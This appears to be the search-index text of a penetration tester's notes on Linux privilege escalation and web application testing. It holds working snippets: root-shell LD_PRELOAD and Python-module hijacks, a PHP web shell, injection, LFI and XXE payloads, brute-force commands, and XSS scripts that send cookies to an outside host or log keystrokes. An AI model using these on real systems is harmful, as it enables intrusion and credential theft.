<code>/etc/default</code> or <code>/etc/sysconfig</code> Files Many SysV init scripts source configuration from <code>/etc/default/servicename</code> or <code>/etc/sysconfig/servicename</code>. If writable, you can modify the environment the service runs in or the path to the binary. Reload &amp; Restart Service to Trigger Execution <pre><code>systemctl daemon-reload\nsystemctl restart vulnerable.service\n</code></pre></p>"},{"location":"Linux/Linux%20Privilege%20Escalation/Shared%20Libraries%20%26%20Interpreter%20Hijacking/","title":"Shared Libraries & Interpreter Hijacking","text":""},{"location":"Linux/Linux%20Privilege%20Escalation/Shared%20Libraries%20%26%20Interpreter%20Hijacking/#ld_preload-shared-library-hijacking","title":"LD_PRELOAD &amp; Shared Library Hijacking","text":"<ol> <li>Find Binaries That Honor LD_PRELOAD (Including SUID) <pre><code>find / -perm -4000 -type f 2&gt;/dev/null | while read -r bin; do\n  echo \"[*] Checking $bin\"\n  ldd \"$bin\" 2&gt;/dev/null | grep \"=&gt;\" &amp;&amp; echo \"[+] $bin loads shared libs\"\ndone\n</code></pre></li> <li>Create a Malicious Shared Object <pre><code>// exploit.c\n#include &lt;unistd.h&gt;\nvoid __attribute__((constructor)) init() {\n    setuid(0);\n    setgid(0);\n    system(\"/bin/sh\");\n}\n</code></pre> <pre><code>gcc -shared -fPIC -o /tmp/exploit.so exploit.c\n</code></pre></li> <li>Preload &amp; Execute the SUID Binary <pre><code>export LD_PRELOAD=/tmp/exploit.so\n/path/to/suid_binary\n</code></pre></li> <li>If the binary loads <code>libc</code> or another library, your <code>exploit.so</code> runs as root.</li> <li>Modify <code>/etc/ld.so.conf.d</code> if Writable <pre><code>echo \"/home/user/mylibs\" &gt; /etc/ld.so.conf.d/malicious.conf\nldconfig\n</code></pre></li> <li>Place your <code>.so</code> in <code>/home/user/mylibs</code> and run the vulnerable binary.</li> </ol>"},{"location":"Linux/Linux%20Privilege%20Escalation/Shared%20Libraries%20%26%20Interpreter%20Hijacking/#python-module-hijacking","title":"Python Module Hijacking","text":"<ol> <li>Locate SUID Python Scripts <pre><code>find / -perm -4000 -type f | grep \"\\.py$\" 2&gt;/dev/null\n</code></pre></li> <li>Create malicious python module <pre><code>mkdir -p /tmp/malicious\ncat &lt;&lt; 'EOF' &gt; /tmp/malicious/pickle.py\nimport os\nos.setuid(0)\nos.system(\"/bin/sh\")\nEOF\n</code></pre></li> <li>Set PYTHONPATH and Run the Script <pre><code>export PYTHONPATH=/tmp/malicious:$PYTHONPATH\n/usr/bin/vulnerable_suid_script.py\n</code></pre></li> <li>If <code>vulnerable_suid_script.py</code> does <code>import pickle</code> (or another module you control), it spawns a root shell.</li> </ol>"},{"location":"Linux/Linux%20Privilege%20Escalation/Writable%20Directories/","title":"Writable Directories","text":"<p>Find World-Writable Directories <pre><code>find / -type d -perm -002 -ls 2&gt;/dev/null\n</code></pre> Find World-Writable Files <pre><code>find / -type f -perm -002 -ls 2&gt;/dev/null\n</code></pre></p>"},{"location":"Web%20Application/","title":"Under Construction","text":"<p>The notes in this section are still being migrated and are incomplete</p> <p>Resources</p> <ul> <li>https://owasp.org/www-project-web-security-testing-guide/</li> <li>https://github.com/muslumsecurity/top25-parameters/tree/main</li> </ul>"},{"location":"Web%20Application/Insecure%20File%20Uploads/","title":"Insecure File Uploads","text":"<pre><code>&lt;?php system($_GET['cmd']); ?&gt;\n</code></pre>"},{"location":"Web%20Application/Insecure%20File%20Uploads/#client-side","title":"Client-Side","text":"<ul> <li>Intercept request, modify filetype, and filename, and replace data, send modified request</li> </ul>"},{"location":"Web%20Application/Insecure%20File%20Uploads/#server-side-bypasses","title":"Server-Side Bypasses","text":"<p>extensions <pre><code>shell.php.png\nshell.php%00.png\nshell.phtml\nshell.inc\nshell.php3\nshell.php4\nshell.php5\n</code></pre> Content-Type <pre><code>kinda useless\n</code></pre> magic bytes https://en.wikipedia.org/wiki/List_of_file_signatures - Intercept request, insert php below magic bytes header, change filetype to php, and send</p>"},{"location":"Web%20Application/Verb%20Tampering/","title":"Verb Tampering","text":"<code>GET</code> The <code>GET</code> method requests a representation of the specified resource. Requests using <code>GET</code> should only retrieve data and should not contain a request content. <code>HEAD</code> The <code>HEAD</code> method asks for a response identical to a <code>GET</code> request, but without a response body. <code>POST</code> The <code>POST</code> method submits an entity to the specified resource, often causing a change in state or side effects on the server.T <code>PUT</code> The <code>PUT</code> method replaces all current representations of the target resource with the request content. <code>DELETE</code> The <code>DELETE</code> method deletes the specified resource. <code>CONNECT</code> The <code>CONNECT</code> method establishes a tunnel to the server identified by the target resource. <code>OPTIONS</code> The <code>OPTIONS</code> method describes the communication options for the target resource. <code>TRACE</code> The <code>TRACE</code> method performs a message loop-back test along the path to the target resource. <code>PATCH</code> The <code>PATCH</code> method applies partial modifications to a resource."},{"location":"Web%20Application/Web%20Application%20Firewall/","title":"Web Application Firewall","text":""},{"location":"Web%20Application/Web%20Application%20Firewall/#waf-fingerprinting","title":"WAF Fingerprinting","text":"<p>wafw00f <pre><code>wafw00f &lt;URL&gt;\n</code></pre> Input known bad payload to understand WAF response *Input known good payload to understand standard response</p>"},{"location":"Web%20Application/API/-%20Getting%20Started/","title":"Getting Started","text":"<p>Quick wins</p> <ul> <li>Lack of rate limiting is common for APIs</li> </ul>"},{"location":"Web%20Application/API/API/","title":"API","text":"<p>Post data <pre><code>curl -X POST -k &lt;ENDPOINT&gt; -d '{key:\"value\"}'\n</code></pre> proxy through burp <pre><code>curl -X POST -k --proxy http://localhost:8080 &lt;ENDPOINT&gt; -d '{key:\"value\"}'\n</code></pre></p>"},{"location":"Web%20Application/API/Mass%20Assignment/","title":"Mass Assignment","text":"<p>Certain application will assign values to keys and use them to create an object that encompasses those values. If you can discover controllable inputs (like adding an item to a cart, or checkout flow) you may be able to assign arbitrary values to params you're not supposed to - such as making <code>\"discountPercent\":100</code> etc... to discover potential assignable keys used to build objects. you can:</p> <ul> <li>Discover them in requests</li> <li>Code reveiw</li> <li>Fuzzing</li> <li>API leaking lots of data</li> <li>front end code</li> <li>JWT claims </li> </ul> <p>Once discovered, you can just make a request with the modified params.</p>"},{"location":"Web%20Application/Access%20Control/Broken%20Function%20Level%20Access%20%28BLFA%29/","title":"Broken Function Level Access (BLFA)","text":"<p>Using a low privileged users session token, can you perform actions of another user? of a higher privileged user? </p> <p>Use multiple accounts for testing, preferably two user accounts and two admin accounts. Proxy an admin request through burp and execute an admin function, repeat this request but replace the admin session token with the user sessions token. Is the admin function executed?</p> <p>Tip:</p> <p>Utilize the firefox containers addon to maintain sessions across multiple account for ease of use. </p>"},{"location":"Web%20Application/Access%20Control/Insecure%20Direct%20Object%20Reference%20%28IDOR%29/","title":"Insecure Direct Object Reference (IDOR)","text":"<p>Similar to Broken Object Level Access (BOLA) but less API focused, for example, iterating a pageID or page directory to view information of other users.</p> <p>ffuf</p> <ul> <li>if you have UIDs (can be anything) <code>-mr</code> = regex match <pre><code>ffuf -u &lt;http://example.com/info.php?account=FUZZ&gt; -w &lt;UIDLIST&gt; -mr 'admin'\n</code></pre></li> </ul>"},{"location":"Web%20Application/Access%20Control/Insecure%20Direct%20Object%20Reference%20%28IDOR%29/#api","title":"API","text":"<p>Post data <pre><code>curl -X POST -k &lt;ENDPOINT&gt; -d '{key:\"value\"}'\n</code></pre> proxy through burp <pre><code>curl -X POST -k --proxy http://localhost:8080 &lt;ENDPOINT&gt; -d '{key:\"value\"}'\n</code></pre></p>"},{"location":"Web%20Application/Authentication/-%20Getting%20Started/","title":"Getting Started","text":"<p>General Starting Point</p> <ul> <li>Map entire auth flow / attack surface</li> <li>Proxy requests, target a functionality, step through entire process, then review every step in the chain via the proxy requests.</li> <li>Create multiple accounts for testing</li> <li>Check for brute-force protection</li> <li>Is the application using a standard library?</li> <li>Logic Flaws</li> <li>Inspect tokens</li> </ul>"},{"location":"Web%20Application/Authentication/-%20Getting%20Started/#wordlist-resources","title":"Wordlist Resources","text":"<ul> <li>https://wordlists.assetnote.io/</li> </ul>"},{"location":"Web%20Application/Authentication/Brute%20Forcing%20Authentication/","title":"Brute Forcing Authentication","text":"<p>ffuf</p> <ul> <li>Save request \u201ccopy to file\u201d from burp - Replace \u201cpassword\u201d param with \u201cFUZZ\u201d</li> <li> <p>Run with no filter, determine invalid response size, add <code>fs &lt;SIZE&gt;</code> , re-run command <pre><code>ffuf -request r.txt -fs &lt;SIZE&gt; -request-proto http -w /usr/share/seclists/Passwords/xato-net-10-million-passwords.txt:FUZZ\n</code></pre> fuff - fuzz all permutations of multiple parameters (clusterbomb)</p> </li> <li> <p>Modify the request with two keywords, append them to the proper wordlists <pre><code>ffuf -request r.txt -request-proto http -mode clusterbomb -w /usr/share/seclists/Passwords/xato-net-10-million-passwords.txt:FUZZPASS -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt:FUZZUSER\n</code></pre> hydra <pre><code>hydra -V -L ../wordlists/users.txt -P ../wordlists/pass.txt 192.168.187.133 http-get-form \"/dvwa/vulnerabilities/brute/:username=^USER^&amp;password=^PASS^&amp;Login=Login:F=Username and/or password incorrect.:H=Cookie\\: PHPSESSID=XXXXX; security=low\"\n</code></pre></p> </li> </ul>"},{"location":"Web%20Application/Authentication/Brute%20Forcing%20Authentication/#user-enumeration","title":"User Enumeration","text":"<ul> <li>Check if response is different for failed username vs failed password</li> </ul>"},{"location":"Web%20Application/Authentication/Brute%20Forcing%20Authentication/#timing-technique","title":"Timing technique:","text":"<ul> <li>Attempt usernames with an extremely long password<ul> <li>Does the application take longer to check the password when the username is valid? </li> <li>Check response times !</li> </ul> </li> </ul>"},{"location":"Web%20Application/Authentication/Json%20Web%20Tokens%20%28JWTs%29/","title":"Json Web Tokens (JWTs)","text":"<p>Burpsuite \"JWT Editor\" Extension is helpful</p> <p>note</p> <p>When you remove the signature, you usually need to retain the trailing dot.</p> <p>note</p> <p>When testing JWTs, test similar to BFLA and BOLA and IDOR, make two users and see if you can modify user2s information by changing the user claim on the JWT from user1.</p>"},{"location":"Web%20Application/Authentication/Json%20Web%20Tokens%20%28JWTs%29/#signing-attacks","title":"Signing attacks","text":"<ul> <li>Does the application check if the signature has been modified? Can we edit the claims and have them accepted?</li> <li>Can we change the algorithm and sign them ourselves?</li> <li>Does the application check if the token is signed? </li> <li>Can we bruteforce the key?</li> </ul>"},{"location":"Web%20Application/Authentication/Json%20Web%20Tokens%20%28JWTs%29/#header-injection","title":"Header Injection","text":"<p>Headers to use in the attack:</p> <ul> <li>JWK (JSON web key)</li> <li>JKU (JSON web key set url)</li> <li>KID (Key ID)</li> </ul> <p>We can potentially inject an arbitrary JSON web key, the application will then use this key to verify subsequent tokens.</p> <ol> <li>Use JWT editor (burp) to create a new RSA key. </li> <li>Modify the web token to the administrator claim.</li> <li>Click \"attack\" --&gt; embed JWK --&gt; select key --&gt; match the signing algo from the original</li> <li>Send to application and verify results.</li> </ol>"},{"location":"Web%20Application/Authentication/Json%20Web%20Tokens%20%28JWTs%29/#tooling","title":"Tooling","text":"<p>https://github.com/ticarpi/jwt_tool Includes a great workflow and a ton of automated exploitation options including cracking tokens. Good resource: https://github.com/ticarpi/jwt_tool/wiki</p>"},{"location":"Web%20Application/Authentication/Multi-Factor%20Authentication/","title":"Multi Factor Authentication","text":"<p>General things to look for:</p> <ul> <li>Forceful Browsing</li> <li>Changing parameters</li> <li>Changing body content</li> <li>Are thing predictable?</li> <li>Backup codes present?</li> <li>Same code, multiple accounts?</li> <li>Can we trigger an error/weird behavior</li> <li>Can you skip steps in the MFA flow?</li> </ul>"},{"location":"Web%20Application/Authentication/Rate%20Limiting/","title":"Rate Limiting","text":""},{"location":"Web%20Application/Authentication/Rate%20Limiting/#identify-rate-limiting-technique","title":"Identify rate limiting technique","text":"<p>Potential:</p> <ul> <li>Headers?</li> <li>User agents?</li> <li>Cookies? Session tokens?</li> <li>HTTP verb tamperng?</li> <li>Decrease amount and speed of requests?</li> </ul> <p>Quick win headers: <pre><code>X-Real-IP:\nX-Forwarded-For:\nX-Originating-IP:\nClient-IP:\nTrue-Client-IP:\n</code></pre> 1st, get yourself rate limited, then send a request with these headers, check bypass <pre><code>POST / HTTP/2\nHost: jacobh.io\nSec-Ch-Ua: \"Not?A_Brand\";v=\"99\", \"Chromium\";v=\"130\"\nSec-Ch-Ua-Mobile: ?0\nSec-Ch-Ua-Platform: \"Linux\"\nAccept-Language: en-US,en;q=0.9\nUpgrade-Insecure-Requests: 1\nX-Real-IP: 1.2.3.4\nX-Forwarded-For: 1.2.3.4\nX-Originating-IP: 1.2.3.4\nClient-IP: 1.2.3.4\nTrue-Client-IP: 1.2.3.4\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nSec-Fetch-Site: none\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?1\nSec-Fetch-Dest: document\nAccept-Encoding: gzip, deflate, br\nPriority: u=0, i\nConnection: keep-alive\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 0\n</code></pre> Also try localhost <pre><code>X-Real-IP: 127.0.0.1\nX-Forwarded-For: 127.0.0.1\nX-Originating-IP: 127.0.0.1\nClient-IP: 127.0.0.1\nTrue-Client-IP: 127.0.0.1\n</code></pre></p>"},{"location":"Web%20Application/Authentication/Session%20Tokens/","title":"Session Tokens","text":"<p>Determine if a token warrents further investigation</p> <ul> <li>send multiple requests with valid login to login endpoint<ul> <li>Do tokens change?</li> <li>Is any part of the token static? </li> </ul> </li> </ul>"},{"location":"Web%20Application/Authentication/Session%20Tokens/#burp-sequencer","title":"Burp Sequencer","text":"<ul> <li>Sequencer will allow you to request many tokens and automatically assess their entropy. </li> <li>Sequencer identifies some patterns in a token, we should spend time investigating that token further.</li> </ul>"},{"location":"Web%20Application/Discovery/Directory%20Fuzzing/","title":"Directory Fuzzing","text":""},{"location":"Web%20Application/Discovery/Directory%20Fuzzing/#directory-fuzzing","title":"Directory Fuzzing","text":"<p>ffuf <pre><code>ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u &lt;URL&gt;/FUZZ\n</code></pre> <pre><code>ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u &lt;URL&gt;/FUZZ -recursion\n</code></pre> <pre><code>ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u &lt;URL&gt;/FUZZ -fc 200\n</code></pre> dirb <pre><code>dirb &lt;URL&gt; /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n</code></pre> <pre><code>dirb &lt;URL&gt; -X .html\n</code></pre> feroxbuster <pre><code>feroxbuster -u http://example.com -x php,html,htm,asp,aspx\n</code></pre> dirsearch <pre><code>dirsearch -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64 -e php,txt,html -f -u http://example.com\n</code></pre></p>"},{"location":"Web%20Application/Discovery/Google%20Dorks/","title":"Google Dorks","text":"<p>Dorks <pre><code>site:site.com filetype:pdf\n</code></pre> - crt.sh - search through certificates <pre><code>%.site.com\n</code></pre> Asset finder: https://github.com/tomnomnom/assetfinder <pre><code>assetfinder &lt;DOMAIN&gt;\n</code></pre> <pre><code>assetfinder &lt;DOMAIN&gt; | grep &lt;DOMAIN&gt; | sort -u\n</code></pre> amass <pre><code>amass enum -d &lt;DOMAIN&gt;\n</code></pre> httpprobe <pre><code>cat &lt;SUBDOMAINSLIST&gt; | grep &lt;domain&gt; | sort -u | httpprobe -prefer-https | grep https\n</code></pre></p>"},{"location":"Web%20Application/Discovery/Parameter%20Fuzzing/","title":"Parameter Fuzzing","text":"<p>GET <pre><code>ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u https://example.com/administration/admin.php?FUZZ=key\n</code></pre> Then filter for size <pre><code>ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u https://example.com/administration/admin.php?FUZZ=key -fs &lt;size&gt;\n</code></pre> POST <pre><code>ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u https://example.com/administration/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs &lt;size filter&gt;\n</code></pre></p> <p>note</p> <p>Tip: In PHP, \"POST\" data \"content-type\" can only accept \"application/x-www-form-urlencoded\". So, we can set that in \"ffuf\" with -H</p>"},{"location":"Web%20Application/File%20Inclusion/Filter%20Bypasses/","title":"Filter Bypasses","text":"<p>Things to consider:</p> <ul> <li>Are filters applied recursively ?</li> <li>Insufficient character blacklist</li> <li>Not using allow lists</li> <li>Can it properly handle encoded payloads?</li> </ul>"},{"location":"Web%20Application/File%20Inclusion/Filter%20Bypasses/#basic","title":"Basic","text":"<p>Non-recursive filter bypass <pre><code>http://example.com/read.php?file=..././..././..././..././..././..././etc/passwd\n</code></pre> Mangle capitals &amp; operators for filter bypasses <pre><code>http://example.com/read.php?file=..././..././..././..././..././..././eTc/p+AsS+wd\n</code></pre> Play with the characters, determine if certain characters are being stripped out, you may be able to abuse the order at which chars are stripped out. for example: if <code>$</code> is being filtered out at the last step of the process, you may be able to split your payload with that characters, with it being reconstructed post filter. <pre><code>/.$./.$./.$./etc/passwd\n</code></pre> becomes: <pre><code>/../../../etc/passwd\n</code></pre></p>"},{"location":"Web%20Application/File%20Inclusion/Filter%20Bypasses/#php-wrappers","title":"PHP Wrappers","text":"<p>https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/Wrappers.md</p> <ul> <li>Leak php code instead of executing it. <pre><code>http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php\nhttp://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php\nhttp://example.com/index.php?page=php://filter/convert.iconv.utf-8.utf-16/resource=index.php\nhttp://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php\n</code></pre></li> </ul>"},{"location":"Web%20Application/File%20Inclusion/Local%20File%20Inclusion%20%28LFI%29/","title":"Local File Inclusion (LFI)","text":"<p>note</p> <p>Try to exploit 1st by replacing the expected value, then by appending your payload after the expected value. If you see a path <code>/var/www/images/5.jpg</code> we may need to insert our payload not at the root, but instead of 5.jpg - the application may be expecting the preceding path to exist in the request. </p> <p>List of payloads</p> <p>https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion</p> <p>ffuf - Copy request to file via burp <pre><code>ffuf -request r -request-proto http -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt\n</code></pre> Filter by wordcount <pre><code>ffuf -request r -request-proto http -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -fw 19,20\n</code></pre></p> <p>List of most common LFI parameters <pre><code>?cat={payload}\n?dir={payload]\n?action={payload}\n?board={payload}\n?date={payload}\n?detail={payload}\n?file={payload}\n?download={payload}\n?path={payload}\n?folder={payload}\n?prefix={payload}\n?include={payload}\n?page={payload]\n?inc={payload}\n?locate={payload}\n?show={payload}\n?doc={payload}\n?site={payload}\n?type={payload}\n?view={payload}\n?content={payload}\n?document={payload}\n?layout={payload}\n?mod={payload}\n?conf={payload}\n</code></pre></p>"},{"location":"Web%20Application/Injections/Command%20Injection/","title":"Command Injection","text":"<p>https://book.hacktricks.xyz/pentesting-web/command-injection Payloads <pre><code>; whoami\n</code></pre> <pre><code>; whoami ;\n</code></pre> <pre><code>; whoami ; #\n</code></pre> Close logic via our controlled input, then execute <pre><code> awk 'BEGIN {print sqrt(((-2)^2) + ((-3)^2))}'\n</code></pre> <pre><code>3)^2))}';whoami;#\n</code></pre></p>"},{"location":"Web%20Application/Injections/Command%20Injection/#blind","title":"Blind","text":"<p><pre><code>http://LOCALIP&gt;:PORT/?=`whoami`\n</code></pre> Response on listening server: <pre><code>HEAD /?=www-data HTTP/1.1\n</code></pre></p>"},{"location":"Web%20Application/Injections/Cross-Site%20Scripting%20%28XSS%29/","title":"Cross Site Scripting (XSS)","text":"<p>https://appsecexplained.gitbook.io/appsecexplained/common-vulns/javascript-injection-xss/xss-methodology</p>"},{"location":"Web%20Application/Injections/Cross-Site%20Scripting%20%28XSS%29/#identify","title":"Identify","text":"<p>Are we able to control any data that is being reflected back and rendered by the application?</p> <p>Important considerations:</p> <ul> <li>Where is the payload executing?</li> <li>What input validation exists?</li> </ul>"},{"location":"Web%20Application/Injections/Cross-Site%20Scripting%20%28XSS%29/#htlm-tag-context","title":"HTLM Tag Context","text":"<p>If we have control over content that is being reflected in an html tag. You can try to close the tag and exec <pre><code>\"&gt;&lt;script&gt;prompt(1)&lt;/script&gt;\n\"&gt;&lt;img src=x onerror=\"prompt(1)\"&gt;\n</code></pre> If you have control over an <code>href</code> you can try the javascript browser scheme <pre><code>http://example.com --&gt; javascript:prompt()\n</code></pre> Or just close tag early <pre><code>&lt;/selected&gt;&lt;img src=x onerror=\"prompt(1)\"&gt;\n</code></pre></p>"},{"location":"Web%20Application/Injections/Cross-Site%20Scripting%20%28XSS%29/#javascript-context","title":"Javascript context","text":"<p>If we have control over content that is being reflected into a javascript context. Example: <pre><code>var querySearch = 'controlledInput'\n</code></pre> Break the quote by appending input and comment out trailing semicolon. <pre><code>controlledInput';prompt()//';\n</code></pre></p>"},{"location":"Web%20Application/Injections/Cross-Site%20Scripting%20%28XSS%29/#general","title":"General","text":""},{"location":"Web%20Application/Injections/Cross-Site%20Scripting%20%28XSS%29/#quickly-test-for-unfiltered-tags","title":"Quickly test for unfiltered tags","text":"<ol> <li>Get a list of tags (copy to clipboard https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)</li> <li>Intercept request with burp, send to intruder. </li> <li>Paste the tags into the payloads. </li> <li>Start attack, monitor for unfiltered response codes, different length responses, etc...</li> <li>You've hopefully found an unfiltered tag.</li> <li>You can append portions of the payloads to determine exactly what is triggering the block.</li> <li>Copy the events from portswigger, do the same thing for the event portion of the payload.</li> </ol> <p>Test html injection first, usually this is a good indicator (JS = you might need to bypass filter) <pre><code>&lt;h1&gt;test&lt;/h1&gt;\n</code></pre> Payloads <pre><code>&lt;script&gt;alert()&lt;/script&gt;\n</code></pre> <pre><code>&lt;script&gt;print()&lt;/script&gt;\n</code></pre> <pre><code>&lt;script&gt;prompt(\"string\")&lt;/script&gt;\n</code></pre> <pre><code>&lt;script&gt;alert(window.origin)&lt;/script&gt;\n</code></pre> <pre><code> &lt;plaintext&gt;\n</code></pre></p> <p>info</p> <p>Many modern web applications utilize cross-domain IFrames to handle user input, so that even if the web form is vulnerable to XSS, it would not be a vulnerability on the main web application. This is why we are showing the value of window.origin in the alert box, instead of a static value like 1. In this case, the alert box would reveal the URL it is being executed on</p> <p>You need to trigger XSS if not executed on page load <pre><code>&lt;img src=x onerror=\"prompt(1)\"&gt;\n</code></pre> Redirect <pre><code>&lt;img src=x onerror=\"window.location.href='&lt;https://example.com&gt;'\"&gt;\n</code></pre> script tag filter <pre><code>&lt;img src=x onerror=print()&gt;\n</code></pre> <pre><code>&lt;scri&lt;script&gt;pt&gt;prompt(1)&lt;scri&lt;/scr&lt;/script&gt;ipt&gt;\n</code></pre> Keylogger <pre><code>function logKey(event){console.log(event.key)}\n</code></pre> <pre><code> document.addEventListener('keydown', logKey)\n</code></pre></p>"},{"location":"Web%20Application/Injections/Cross-Site%20Scripting%20%28XSS%29/#dom-xss","title":"DOM XSS","text":""},{"location":"Web%20Application/Injections/Cross-Site%20Scripting%20%28XSS%29/#identify_1","title":"Identify","text":"<p>You have XSS execution, but no http requests are being made. We see that the input parameter in the URL is using a hashtag # for the item we added, which means that this is a client-side parameter that is completely processed on the browser. This indicates that the input is being processed at the client-side through JavaScript and never reaches the back-end. This is DOM XSS if we look at the page source by hitting <code>CTRL+U</code>, we will notice that our <code>test</code> string is nowhere to be found. This is because the JavaScript code is updating the page when we click the <code>Add</code> button We can still view the rendered page source with the Web Inspector tool by clicking <code>CTRL+SHIFT+C</code>:</p>"},{"location":"Web%20Application/Injections/Cross-Site%20Scripting%20%28XSS%29/#stored","title":"Stored","text":"<p>Steal admin cookie (classic) <pre><code>&lt;script&gt;fetch(\"&lt;http://192.168.187.130:9999/&gt;\" + document.cookie)&lt;/script&gt;\n</code></pre> <pre><code>&lt;script&gt;var i = new Image; i.src=\"https://webhook.site/9b3374bf-b997-4021-a302-de75a26fd841/?\"+document.cookie;&lt;/script&gt;\n</code></pre></p> <p>note</p> <p>Sometimes you may need to trigger the payload with JS as well (JS to resize the screen when using an onresize event to trigger)</p>"},{"location":"Web%20Application/Injections/Cross-Site%20Scripting%20%28XSS%29/#automated-with-dom-invader","title":"Automated with DOM Invader","text":"<p>Turn DOM invader on via the burp extension. Open dev tools,click DOM Invader tab. Input the provided canary to potential execution. DOM Invader will identify sources and sinks for that data.</p>"},{"location":"Web%20Application/Injections/Cross-Site%20Scripting%20%28XSS%29/#note-on-cors","title":"Note on CORS","text":"<p>CORS policy will not block data exfil, only the REPONSES from non-allowlisted domains are blocked. The request will still be made, (to your webhook etc) just pass the <code>mode: 'no-cors'</code></p>"},{"location":"Web%20Application/Injections/Cross-Site%20Scripting%20%28XSS%29/#extending-xss","title":"Extending XSS","text":"<p>Steal cookies <pre><code>&lt;img src=\"http://localhost?c='+document.cookie+'\" /&gt; fetch(\"http://localhost?c=\"+document.cookie);\n</code></pre> Accessing local &amp; session storage <pre><code>let localStorageData = JSON.stringify(localStorage) let sessionStorageData = JSON.stringify(sessionStorage)\n</code></pre> Autofill stealer <pre><code>// create the input elements\nlet usernameField = document.createElement(\"input\")\nusernameField.type = \"text\"\nusernameField.name = \"username\"\nusernameField.id = \"username\"\nlet passwordField = document.createElement(\"input\")\npasswordField.type = \"password\"\npasswordField.name = \"password\"\npasswordField.id = \"password\"\n// append the elements to the body of the page\ndocument.body.appendChild(usernameField)\ndocument.body.appendChild(passwordField)\n// exfiltrate as needed (we need to wait for the fields to be\nfilled before exfiltrating the information)\nsetTimeout(function() {\nconsole.log(\"Username:\",\ndocument.getElementById(\"username\").value)\nconsole.log(\"Password:\",\ndocument.getElementById(\"password\").value)\n</code></pre></p> <p>Session Riding <pre><code>let xhr = new XMLHttpRequest();\nxhr.open('POST','http://localhost/updateprofile',true);\nxhr.setRequestHeader('Content-type','application/x-www-form-\nurlencoded');\nxhr.send('email=updated@email.com (mailto:updated@email.com)\u2019);\n</code></pre> Keylogging <pre><code>Keylogging\ndocument.onkeypress = function(e) {\nget = window.event ? event : e\nkey = get.keyCode ? get.keyCode : get.charCode\nkey = String.fromCharCode(key)\nconsole.log(key)\n}\n</code></pre></p>"},{"location":"Web%20Application/Injections/Cross-Site%20Scripting%20%28XSS%29/#xss-filter-evasion","title":"XSS Filter Evasion","text":"<p>OWASP cheat sheet is pretty good https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html</p>"},{"location":"Web%20Application/Injections/External%20Entity%20Injection%20%28XXE%29/","title":"External Entity Injection (XXE)","text":"<p>https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection</p> <p>Check:</p> <ul> <li>XXE if an application references XML formatted data.</li> <li>If you think an endpoint is only accepting JSON, try to switch to XML and check if the application still accepts it.</li> <li>SVG uploads (try even if the form says png only)</li> <li>DOCX uploads</li> </ul> <p>Potential impact</p> <ul> <li>View files on target server</li> <li>SSRF</li> <li>Exfiltrate Data</li> </ul> <p>Basic payload - file inclusion</p> <pre><code>&lt;?xml version=\"1.0\"?&gt;\n&lt;!DOCTYPE data [\n&lt;!ELEMENT data (\\#ANY)&gt;\n&lt;!ENTITY file SYSTEM \"file:///etc/passwd\"&gt;\n]&gt;\n&lt;data&gt;&amp;file;&lt;/data&gt;\n</code></pre> <p>Ensure you\u2019re following the applications expected format</p> <pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;!DOCTYPE creds [\n&lt;!ELEMENT creds ANY &gt;\n&lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\" &gt;]&gt;\n&lt;creds&gt;&lt;user&gt;&amp;xxe;&lt;/user&gt;&lt;password&gt;pass&lt;/password&gt;&lt;/creds&gt;\n</code></pre> <p>File Upload Intercept image upload, change content type header, and file extension to svg <pre><code>Content-Type: image/svg+xml\n</code></pre> https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#xxe-inside-svg </p> <p>Via XInclude Request is sending data in payload, we can potentially replace the data with XInclude to achieve file inclusion Payload <pre><code>&lt;foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"&gt;\n&lt;xi:include parse=\"text\" href=\"file:///etc/passwd\"/&gt;&lt;/foo&gt;\n</code></pre> </p>"},{"location":"Web%20Application/Injections/NoSQL%20Injection/","title":"NoSQL Injection","text":"<p>SQL but without tables. MongoDB is most popular.  more common, with <code>MongoDB</code> now being the 5th most used database engine (as of November 2022). The way <code>NoSQL</code> databases store data varies significantly across the different categories and implementations.</p> Type Description Top 3 Engines (as of November 2022) Document-Oriented Database Stores data in <code>documents</code> which contain pairs of <code>fields</code> and <code>values</code>. These documents are typically encoded in formats such as <code>JSON</code> or <code>XML</code>. MongoDB, Amazon DynamoDB, Google Firebase - Cloud Firestore Key-Value Database A data structure that stores data in <code>key:value</code> pairs, also known as a <code>dictionary</code>. Redis, Amazon DynamoDB, Azure Cosmos DB Wide-Column Store Used for storing enormous amounts of data in <code>tables</code>, <code>rows</code>, and <code>columns</code> like a relational database, but with the ability to handle more ambiguous data types. Apache Cassandra, Apache HBase, Azure Cosmos DB Graph Database Stores data in <code>nodes</code> and uses <code>edges</code> to define relationships. Neo4j, Azure Cosmos 